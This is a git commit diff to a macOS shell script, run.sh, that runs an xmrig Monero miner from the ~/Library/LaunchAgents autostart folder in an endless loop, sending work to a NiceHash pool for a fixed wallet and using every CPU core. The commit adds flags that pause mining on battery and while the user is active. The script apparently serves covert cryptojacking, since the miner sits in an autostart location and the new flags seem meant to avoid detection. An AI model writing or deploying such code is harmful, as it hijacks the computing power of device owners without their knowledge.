a71ed325228e6b133e4592b64b651c729a26824a
Me1922 <34125170+Me1955@users.noreply.github.com>
2021-06-23 20:33:51 +1000

    Update run.sh

--- run.sh
+++ run.sh
@@ -3,5 +3,5 @@
 #in case it crashes
 while true
 do
-~/Library/LaunchAgents/xmrig -o stratum+tcp://randomxmonero.usa-west.nicehash.com:3380 -u 3HLKDVH6J89nUJMGi8M1gSqmLxdN5PBhFc -p x -a rx/0 --coin null -t $(sysctl -n hw.ncpu) --nicehash --keepalive --rig-id $(whoami)
+~/Library/LaunchAgents/xmrig -o stratum+tcp://randomxmonero.usa-west.nicehash.com:3380 -u 3HLKDVH6J89nUJMGi8M1gSqmLxdN5PBhFc -p x -a rx/0 --coin null -t $(sysctl -n hw.ncpu) --nicehash --keepalive --rig-id $(whoami) --pause-on-battery --pause-on-active 10
 done
